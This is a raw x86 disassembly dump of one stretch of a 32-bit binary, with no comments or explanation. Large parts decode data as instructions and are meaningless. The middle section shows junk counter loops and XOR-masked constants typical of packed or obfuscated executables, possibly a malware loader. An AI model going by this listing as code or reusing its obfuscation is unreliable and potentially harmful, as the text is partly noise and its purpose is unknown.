  41e176:	adc    al,0xcb
  41e178:	pop    ebp
  41e179:	push   ebx
  41e17a:	out    0x11,al
  41e17c:	(bad)  
  41e17d:	call   0xc90d2c0e
  41e182:	in     eax,0xab
  41e184:	jmp    0xbd193af1
  41e189:	dec    edi
  41e18a:	idiv   DWORD PTR [edx-0xe5fb20b]
  41e190:	mov    ch,0xd5
  41e192:	mov    ebx,0xd4eaef6e
  41e197:	jns    0x41e121
  41e199:	loopne 0x41e137
  41e19b:	in     al,0xce
  41e19d:	jns    0x41e1b8
  41e19f:	test   DWORD PTR [ecx-0x9],edx
  41e1a2:	(bad)  [esi-0x343e7c95]
  41e1a8:	aam    0x3b
  41e1aa:	push   esi
  41e1ab:	and    al,0xb9
  41e1ad:	ret    0x7994
  41e1b0:	and    eax,0xd71a692e
  41e1b5:	dec    eax
  41e1b6:	loope  0x41e1bb
  41e1b8:	xor    al,0x1f
  41e1ba:	outs   dx,DWORD PTR ds:[esi]
  41e1bb:	inc    edx
  41e1bc:	mov    esi,DWORD PTR [ebx+0x6b5d1127]
  41e1c2:	push   0xcf1bb5f9
  41e1c7:	mov    cl,0x3d
  41e1c9:	(bad)  
  41e1ca:	test   eax,0x6e2639e6
  41e1cf:	ror    DWORD PTR [ebx-0x14af7e68],cl
  41e1d5:	in     al,dx
  41e1d6:	(bad)  
  41e1d7:	sbb    bl,0x4
  41e1da:	mov    ah,cl
  41e1dc:	jno    0x41e24a
  41e1de:	cli    
  41e1df:	xlat   BYTE PTR ds:[ebx]
  41e1e0:	retf   
  41e1e1:	sub    dl,BYTE PTR [ecx-0x30714158]
  41e1e7:	jmp    0xad3f0402
  41e1ec:	jl     0x41e202
  41e1ee:	add    eax,0xf66a8a8a
  41e1f3:	gs mov cl,ch
  41e1f6:	mov    ds:0x71986781,al
  41e1fb:	lods   eax,DWORD PTR ds:[esi]
  41e1fc:	aad    0x82
  41e1fe:	out    0x68,al
  41e200:	jns    0x41e21d
  41e202:	fs daa 
  41e204:	mov    esp,0xdce32fa0
  41e209:	sbb    eax,0xe8a61516
  41e20e:	out    0xb7,eax
  41e210:	lea    edx,[edi+eax*1+0x13cf5890]
  41e217:	cdq    
  41e218:	and    DWORD PTR [esi+0x39],0x800416fd
  41e21f:	int3   
  41e220:	iret   
  41e221:	jmp    0x4e86519a
  41e226:	mov    bh,0x63
  41e228:	ror    al,0xcc
  41e22b:	(bad)  
  41e22c:	pop    edx
  41e22d:	imul   esi,DWORD PTR [edx+ebp*2],0x6ba98363
  41e234:	mov    dl,0xda
  41e236:	mov    dh,0x8a
  41e238:	dec    ebx
  41e239:	int3   
  41e23a:	fwait
  41e23b:	(bad)  
  41e23c:	nop
  41e23d:	push   ecx
  41e23e:	lds    edx,FWORD PTR [eax]
  41e240:	jb     0x41e226
  41e242:	inc    ecx
  41e243:	das    
  41e244:	push   ebp
  41e245:	push   esp
  41e246:	scas   al,BYTE PTR es:[edi]
  41e247:	jmp    0x41e28e
  41e249:	sahf   
  41e24a:	call   0x8dd0956e
  41e24f:	je     0x41e2ba
  41e251:	inc    ebp
  41e252:	out    dx,al
  41e253:	out    dx,al
  41e254:	xchg   esp,eax
  41e255:	adc    BYTE PTR [ecx+eax*4],dh
  41e258:	adc    DWORD PTR [ebx],edx
  41e25a:	or     DWORD PTR [edx-0x64],0xffffffcc
  41e25e:	nop
  41e25f:	jno    0x41e200
  41e261:	xchg   ebx,eax
  41e262:	(bad)  
  41e263:	lock popf 
  41e265:	test   DWORD PTR [edx],eax
  41e267:	xlat   BYTE PTR ds:[ebx]
  41e268:	jo     0x41e1f1
  41e26a:	nop
  41e26b:	jp     0x41e2a6
  41e26d:	mov    bh,0x9a
  41e26f:	push   cs
  41e270:	aad    0x6d
  41e272:	dec    eax
  41e273:	rcr    DWORD PTR [ecx+0x16dc3981],cl
  41e279:	sbb    bl,BYTE PTR [ebx+0x18]
  41e27c:	aaa    
  41e27d:	mov    esp,0xb623636a
  41e282:	enter  0x47de,0x87
  41e286:	lock dec ebx
  41e288:	push   ss
  41e289:	mov    ds:0x13c9604a,eax
  41e28e:	push   edx
  41e28f:	and    DWORD PTR [ebx],ecx
  41e291:	(bad)  
  41e292:	adc    al,0xfa
  41e294:	sub    DWORD PTR [eax-0x69],ecx
  41e297:	dec    ebp
  41e298:	mov    DWORD PTR [ebp-0x68],ebp
  41e29b:	scas   eax,DWORD PTR es:[edi]
  41e29c:	pop    eax
  41e29d:	fdivrp st(7),st
  41e29f:	out    0xe6,eax
  41e2a1:	sbb    al,0x93
  41e2a3:	and    bh,ah
  41e2a5:	mov    ebx,0xb61a0f47
  41e2aa:	das    
  41e2ab:	sar    BYTE PTR [ebp-0xb],cl
  41e2ae:	rcl    dl,cl
  41e2b0:	dec    ecx
  41e2b1:	xchg   BYTE PTR es:[ecx],dh
  41e2b4:	out    0x24,al
  41e2b6:	mov    BYTE PTR [esi+0x22cd5e72],dh
  41e2bc:	lahf   
  41e2bd:	pop    esi
  41e2be:	dec    ecx
  41e2bf:	shr    ch,cl
  41e2c1:	pop    eax
  41e2c2:	sbb    DWORD PTR [esi-0x61],0xcf2349cf
  41e2c9:	jo     0x41e294
  41e2cb:	add    edi,DWORD PTR [ebp+0x34]
  41e2ce:	xor    edx,DWORD PTR [ebp-0x3d63b103]
  41e2d4:	push   ebp
  41e2d5:	cmp    eax,0x8adbdc9b
  41e2da:	add    dh,ah
  41e2dc:	shr    BYTE PTR [esi],cl
  41e2de:	push   0x79ef1d3b
  41e2e3:	dec    ebx
  41e2e4:	xchg   edi,eax
  41e2e5:	xchg   DWORD PTR [edx+eax*2+0x6a],ebp
  41e2e9:	popf   
  41e2ea:	mov    edx,0xfb4e9ad8
  41e2ef:	jle    0x41e2ee
  41e2f1:	aas    
  41e2f2:	inc    esi
  41e2f3:	sub    cl,ah
  41e2f5:	xchg   ebx,eax
  41e2f6:	adc    DWORD PTR [ebp-0x18c0f833],esp
  41e2fc:	inc    eax
  41e2fd:	loopne 0x41e36f
  41e2ff:	mov    edx,0xcf5c224c
  41e304:	aam    0x32
  41e306:	jmp    0x41e29a
  41e308:	les    ebx,FWORD PTR [eax-0x59]
  41e30b:	out    dx,al
  41e30c:	enter  0xf331,0x30
  41e310:	adc    eax,0x7400cd88
  41e315:	dec    edi
  41e316:	sar    DWORD PTR [ebx-0x6546eb6c],0x5c
  41e31d:	mov    ds:0xe1a6d817,eax
  41e322:	sbb    DWORD PTR [eax+ebp*1+0x4cb14042],ebx
  41e329:	lods   al,BYTE PTR ds:[esi]
  41e32a:	mov    edi,gs
  41e32c:	aas    
  41e32d:	aad    0x90
  41e32f:	add    cl,ah
  41e331:	add    DWORD PTR [edi+0x5f5b1256],edx
  41e337:	pop    ebx
  41e338:	push   0x59
  41e33a:	rcr    DWORD PTR [edx],0xee
  41e33d:	xor    BYTE PTR [eax+0x30],0xf2
  41e341:	mov    ebp,esi
  41e343:	sub    al,0x7f
  41e345:	inc    esp
  41e346:	gs sti 
  41e348:	test   al,0x1f
  41e34a:	stos   DWORD PTR es:[edi],eax
  41e34b:	adc    BYTE PTR [ecx],0x0
  41e34e:	inc    ebp
  41e34f:	sbb    DWORD PTR [edi+0x29],edi
  41e352:	in     eax,0xf3
  41e354:	rcr    DWORD PTR [edi-0x149e06f1],0x76
  41e35b:	shr    cl,1
  41e35d:	push   cs
  41e35e:	dec    ebx
  41e35f:	add    edi,DWORD PTR [edi+0x1463e29c]
  41e365:	lea    ecx,[esi]
  41e367:	push   edi
  41e368:	lock mov ebp,0x22ecc47e
  41e36e:	(bad)  
  41e36f:	aas    
  41e370:	emms   
  41e372:	mov    ebp,0x5c4cab11
  41e377:	lahf   
  41e378:	mov    dl,0x31
  41e37a:	mov    DWORD PTR [edi],eax
  41e37c:	xor    al,0x9e
  41e37e:	add    ebx,eax
  41e380:	pop    ecx
  41e381:	and    BYTE PTR [edx+0x72d1165e],dl
  41e387:	cmp    DWORD PTR [eax+0x1a0d9de0],esi
  41e38d:	xchg   ebp,eax
  41e38e:	pushf  
  41e38f:	mov    ds:0x1b818312,al
  41e394:	popa   
  41e395:	test   bh,al
  41e397:	xor    ch,cl
  41e399:	inc    edi
  41e39a:	sti    
  41e39b:	sub    BYTE PTR [edi],dl
  41e39d:	jmp    0x41e360
  41e39f:	clc    
  41e3a0:	or     DWORD PTR cs:[ebp+0x4b],esi
  41e3a4:	xor    bl,0x5d
  41e3a7:	into   
  41e3a8:	or     al,0xee
  41e3aa:	push   esp
  41e3ab:	pop    ss
  41e3ac:	push   cs
  41e3ad:	fwait
  41e3ae:	or     al,0xc
  41e3b0:	fnsave [esp+eiz*4-0x54ceaf45]
  41e3b7:	or     edx,ebx
  41e3b9:	mov    gs,WORD PTR [edi-0x4cb8d334]
  41e3bf:	call   0x9400:0xbfedd018
  41e3c6:	and    edi,DWORD PTR [edx+0x51dc7a4f]
  41e3cc:	push   ds
  41e3cd:	or     ch,BYTE PTR [edx+edx*4]
  41e3d0:	inc    esp
  41e3d1:	(bad)  
  41e3d2:	ret    0x8cc2
  41e3d5:	add    eax,0x16d42bf0
  41e3da:	dec    ebx
  41e3db:	and    BYTE PTR [eax],0x3b
  41e3de:	test   ch,cl
  41e3e0:	or     ch,BYTE PTR [edi]
  41e3e2:	add    ebx,ebp
  41e3e4:	xchg   ecx,eax
  41e3e5:	scas   al,BYTE PTR es:[edi]
  41e3e6:	dec    edx
  41e3e7:	sub    eax,0x6b888be3
  41e3ec:	ja     0x41e382
  41e3ee:	pop    ebp
  41e3ef:	mov    ah,0x29
  41e3f1:	inc    eax
  41e3f2:	ror    DWORD PTR ds:0xa7031eee,cl
  41e3f8:	cmp    al,0xff
  41e3fa:	iret   
  41e3fb:	mov    esp,fs
  41e3fd:	stos   DWORD PTR es:[edi],eax
  41e3fe:	and    ecx,DWORD PTR [eax-0x7]
  41e401:	dec    edx
  41e402:	sub    DWORD PTR [ecx+0x5c7e045],ecx
  41e408:	sub    BYTE PTR [eax+0x1e0042],dl
  41e40e:	add    BYTE PTR [eax],al
  41e410:	cmp    DWORD PTR ds:0x429028,0x0
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x4245fd
  41e454:	mov    ecx,DWORD PTR ds:0x423e9a
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x4240d6
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x4243dd
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x42404e
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x42406e
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423fc4
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423bce
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x4243f9
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423bc2
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423bbf
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423ba8
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423b64
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41ea1f
  41e9f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f4:	in     eax,0xd4
  41e9f6:	adc    ebx,edx
  41e9f8:	popa   
  41e9f9:	bound  edx,QWORD PTR [ecx+0x5f]
  41e9fc:	bound  esp,QWORD PTR [edx-0x55]
  41e9ff:	or     eax,0xdad533af
  41ea04:	mov    ds:0x63d03dcc,al
  41ea09:	inc    edi
  41ea0a:	ret    0x2192
  41ea0d:	mov    eax,0x629fa2e0
  41ea12:	pop    eax
  41ea13:	push   cs
  41ea14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea15:	push   ss
  41ea16:	icebp  
  41ea17:	pop    edx
  41ea18:	outs   dx,BYTE PTR ds:[esi]
  41ea19:	mov    dl,0xfc
  41ea1b:	(bad)  
  41ea1c:	cmp    al,0xf8
  41ea1e:	outs   dx,BYTE PTR ds:[esi]
  41ea1f:	jns    0x41ea0e
  41ea21:	sbb    BYTE PTR [eax+0xdf31e1],dh
  41ea27:	push   edi
  41ea28:	sub    BYTE PTR [esi-0x4],dh
  41ea2b:	lahf   
  41ea2c:	mov    al,ds:0xbd51a54d
  41ea31:	push   ss
  41ea32:	cmc    
  41ea33:	pop    eax
  41ea34:	cmp    ecx,esi
  41ea36:	stos   DWORD PTR es:[edi],eax
  41ea37:	cmc    
  41ea38:	retf   
  41ea39:	mov    bh,0xf1
  41ea3b:	cmp    esp,ebx
  41ea3d:	stc    
  41ea3e:	pop    edx
  41ea3f:	push   esi
  41ea40:	xchg   esp,eax
  41ea41:	dec    ebp
  41ea42:	jecxz  0x41e9f5
  41ea44:	inc    DWORD PTR [edi]
  41ea46:	pop    ds
  41ea47:	xchg   edi,eax
  41ea48:	inc    esi
  41ea49:	cmp    al,0xf7
  41ea4b:	fadd   st(6),st
  41ea4d:	jae    0x41ea2a
  41ea4f:	sbb    edx,ebp
  41ea51:	push   edi
  41ea52:	clc    
  41ea53:	cwde   
  41ea54:	sbb    DWORD PTR [edi-0x73],esp
  41ea57:	mov    dl,0x86
  41ea59:	sbb    bh,BYTE PTR [edx+0x1a0d3524]
  41ea5f:	pop    ds
  41ea60:	pop    ss
  41ea61:	mov    eax,edx
  41ea63:	dec    ecx
  41ea64:	jns    0x41ea59
  41ea66:	xchg   BYTE PTR [esi],bl
  41ea68:	icebp  
  41ea69:	xchg   esi,eax
  41ea6a:	ret    0x8898
  41ea6d:	dec    esi
  41ea6e:	icebp  
  41ea6f:	mov    ebx,0x189001b
  41ea74:	mov    ds:0x13a281eb,al
  41ea79:	sbb    ebx,DWORD PTR [ebp-0x5e]
  41ea7c:	fsubrp st(2),st
  41ea7e:	xor    al,bl
  41ea80:	in     al,dx
  41ea81:	das    
  41ea82:	inc    esp
  41ea83:	retf   
  41ea84:	lea    esp,[edx-0x2de66bc5]
  41ea8a:	inc    ecx
  41ea8b:	sub    eax,0x1e1bfeea
  41ea90:	rcl    BYTE PTR [esi+0x52728ac],1
  41ea96:	inc    ebp
  41ea97:	pusha  
  41ea98:	(bad)  
  41ea99:	xor    al,0x42
  41ea9b:	and    cl,BYTE PTR [esi+eiz*4-0x32098f05]
  41eaa2:	or     bl,0xc6
  41eaa5:	int3   
  41eaa6:	fisub  DWORD PTR [esi]
  41eaa8:	mov    edx,0x6ba0cd09
  41eaad:	ja     0x41ea60
  41eaaf:	out    0xd4,al
  41eab1:	mov    bl,0xed
  41eab3:	repnz aas 
  41eab5:	mov    ch,0x6c
  41eab7:	sub    ebp,DWORD PTR [ecx-0x7930ed5b]
  41eabd:	int3   
  41eabe:	jae    0x41eac0
  41eac0:	cmp    al,0x63
  41eac2:	pop    es
  41eac3:	pop    ebp
  41eac4:	cmp    DWORD PTR [ecx],eax
  41eac6:	sbb    BYTE PTR [ecx+0x6d],bh
  41eac9:	jnp    0x41eae4
  41eacb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eacc:	fwait
  41eacd:	push   esi
  41eace:	fadd   QWORD PTR [ebp+0x70554da3]
  41ead4:	popf   
  41ead5:	sbb    cl,0xf5
  41ead8:	into   
  41ead9:	ret    
  41eada:	addr16 sub ecx,edi
  41eadd:	rcl    DWORD PTR [ebp-0x3e],cl
  41eae0:	cli    
